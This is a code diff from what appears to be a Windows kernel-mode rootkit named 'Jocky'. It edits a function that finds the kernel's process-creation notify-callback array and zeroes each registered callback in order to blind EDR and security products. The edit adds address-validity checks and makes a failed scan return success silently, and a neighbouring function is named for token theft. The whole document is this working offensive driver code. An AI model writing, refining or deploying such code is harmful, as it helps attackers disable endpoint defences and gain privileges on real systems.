@@ -345,33 +345,34 @@ NTSTATUS JockyStealToken(ULONG targetPid) {
 
 NTSTATUS JockyRemoveCallbacks() {
     ULONG_PTR arrayBase = FindPspCreateProcessNotifyRoutine();
+
     if (!arrayBase) {
-        DbgPrint("[JOCKY] Failed to find callback array\n");
-        return STATUS_NOT_FOUND;
+        DbgPrint("[JOCKY] REMOVE_CALLBACKS: pattern scan returned 0\n");
+        DbgPrint("[JOCKY] No EDR present or scan needs fallback RVA\n");
+        return STATUS_SUCCESS;
     }
 
-    // Array has 64 EX_CALLBACK_ROUTINE_BLOCK* entries
-    // Each is a pointer — if non-null, a callback is registered
-    // Low bits are used as flags — mask them off to get real pointer
+    DbgPrint("[JOCKY] Scanning callback array at 0x%llX\n", arrayBase);
+
     ULONG removed = 0;
 
     for (int i = 0; i < 64; i++) {
         ULONG_PTR* slot = (ULONG_PTR*)(arrayBase + i * sizeof(ULONG_PTR));
+
+        if (!MmIsAddressValid(slot)) break;
+
         ULONG_PTR entry = *slot;
-
         if (entry != 0) {
-            // Get actual pointer (mask off low 4 bits)
             ULONG_PTR cleanPtr = entry & ~0xFULL;
-
-            if (cleanPtr) {
-                // Zero out the slot — callback is removed
+            if (cleanPtr && MmIsAddressValid((PVOID)cleanPtr)) {
                 *slot = 0;
                 removed++;
-                DbgPrint("[JOCKY] Removed callback at slot %d\n", i);
+                DbgPrint("[JOCKY] Removed callback slot %d (was 0x%llX)\n",
+                         i, entry);
             }
         }
     }
 
-    DbgPrint("[JOCKY] Removed %lu process notify callbacks\n", removed);
+    DbgPrint("[JOCKY] Total callbacks removed: %lu\n", removed);
     return STATUS_SUCCESS;
 }
